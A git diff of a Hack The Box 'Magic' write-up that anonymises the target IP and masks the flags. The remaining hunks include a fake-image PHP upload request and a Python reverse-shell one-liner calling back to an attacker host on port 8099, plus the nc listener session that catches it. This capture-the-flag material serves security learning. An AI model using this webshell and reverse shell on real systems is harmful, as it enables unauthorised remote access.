@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Magic
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-magic-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
@@ -24,12 +22,12 @@ Short description to include any strange things to be dealt with
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.185`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
 ```text
-zweilos@kali:~/htb/magic$ nmap -p- -sC -sV -oN magic.nmap 10.10.10.185
+zweilos@kali:~/htb/magic$ nmap -p- -sC -sV -oN magic.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-29 15:28 EDT
-Nmap scan report for 10.10.10.185
+Nmap scan report for <YOUR_IP>
 Host is up (0.050s latency).
 Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
@@ -58,8 +56,8 @@ Starting nikto scan
 
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
-+ Target IP:          10.10.10.185
-+ Target Hostname:    10.10.10.185
++ Target IP:          <YOUR_IP>
++ Target Hostname:    <YOUR_IP>
 + Target Port:        80
 + Start Time:         2020-07-29 15:52:29 (GMT-4)
 ---------------------------------------------------------------------------
@@ -124,12 +122,12 @@ After getting access to the upload page, I crafted an fake image upload with a P
 
 ```http
 POST /upload.php HTTP/1.1
-Host: 10.10.10.185
+Host: <YOUR_IP>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
-Referer: http://10.10.10.185/upload.php
+Referer: http://<YOUR_IP>/upload.php
 Content-Type: multipart/form-data; boundary=---------------------------25702794813234425341306225294
 Content-Length: 392
 Connection: close
@@ -166,13 +164,13 @@ _This text may not work by directly copying and pasting. The PNG file header has
 `pwd` gets me `/var/www/Magic/images/uploads`
 
 ```text
-http://10.10.10.185/images/uploads/htb1.php.png?test=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+http://<YOUR_IP>/images/uploads/htb1.php.png?test=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
  gets me...
 
 ```text
-http://10.10.10.185/images/uploads/htb1.php.png?test=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.57%22,8099));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+http://<YOUR_IP>/images/uploads/htb1.php.png?test=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.57%22,8099));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
 ```
 
 sending a non-image file results in this message: `<script>alert('What are you trying to do there?')</script>`
@@ -184,7 +182,7 @@ to get burp to catch the request I had to go into the settings and disable the d
 ```python
 zweilos@kali:~/Downloads$ nc -lvnp 8099
 listening on [any] 8099 ...
-connect to [10.10.15.57] from (UNKNOWN) [10.10.10.185] 48146
+connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 48146
 /bin/sh: 0: can't access tty; job control turned off
 $ python -c import pty;pty.spawn('/bin/bash');
 /bin/sh: 1: Syntax error: word unexpected (expecting ")")
@@ -453,7 +451,7 @@ theseus@ubuntu:~$ ls
 Desktop    Downloads  Pictures  Templates  Videos
 Documents  Music      Public    user.txt
 theseus@ubuntu:~$ cat user.txt
-123d2363e2d4de4224a39b27400bf87d
+****
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -550,7 +548,6 @@ Units: sectors of 1 * 512 = 512 bytes
 Sector size (logical/physical): 512 bytes / 512 bytes
 I/O size (minimum/optimal): 512 bytes / 512 bytes
 
-
 ...snipped...
 Disk /dev/loop11: 160.2 MiB, 167931904 bytes, 327992 sectors
 Units: sectors of 1 * 512 = 512 bytes
@@ -567,7 +564,6 @@ model name      : AMD EPYC 7401P 24-Core Processor
 
 address sizes   : 43 bits physical, 48 bits virtual
 power management:
-
 
 ====================MEM Usage=====================
               total        used        free      shared  buff/cache   available
@@ -633,7 +629,7 @@ I also had to make sure to make the file was executable by root \(`+x` makes it 
 ```text
 root@ubuntu:/root# cat root.txt
 cat root.txt
-80e2d752b4d0608b8d2f896827290f37
+****
 ```
 
 and here is the sysinfo binary code:
@@ -680,7 +676,3 @@ int main() {
     return(0);
 }
 ```
-
-Thanks to [`TRX`](https://www.hackthebox.eu/home/users/profile/31190) for .
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
